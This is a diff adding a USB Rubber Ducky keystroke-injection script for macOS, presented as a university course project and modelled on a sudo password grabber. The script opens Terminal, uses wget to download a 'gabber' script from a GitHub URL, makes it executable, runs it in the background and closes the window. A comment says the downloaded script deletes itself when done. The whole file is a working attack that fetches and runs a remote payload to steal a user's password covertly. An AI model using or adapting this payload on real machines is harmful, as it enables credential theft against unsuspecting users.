@@ -1,0 +1,34 @@
+REM Author: Brian Sung
+REM This is a course project developed at University of San Francisco. Only for academic or personal use, not for any commercial purpose.
+REM CS683@USFCA
+REM Target: MACOS
+REM Reference: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Linux-and-OSX-sudo-password-grabber
+
+REM Opening terminal
+DELAY 2000
+GUI space
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+
+REM Downloading gabber script and making it executable
+STRING wget -O ~/Downloads/_g.sh https://github.com/ohbriansung/usb_rubber_ducky/auto_mac_pw_grab/gabber.sh
+ENTER
+DELAY 1000
+STRING chmod +x ~/Downloads/_g.sh
+ENTER
+DELAY 500
+
+REM Running the script in background
+STRING ~/Downloads/_g.sh &
+ENTER
+DELAY 1000
+
+REM Closing terminal
+STRING exit
+ENTER
+DELAY 500
+GUI q
+
+REM The script will delete itself after finishing the task
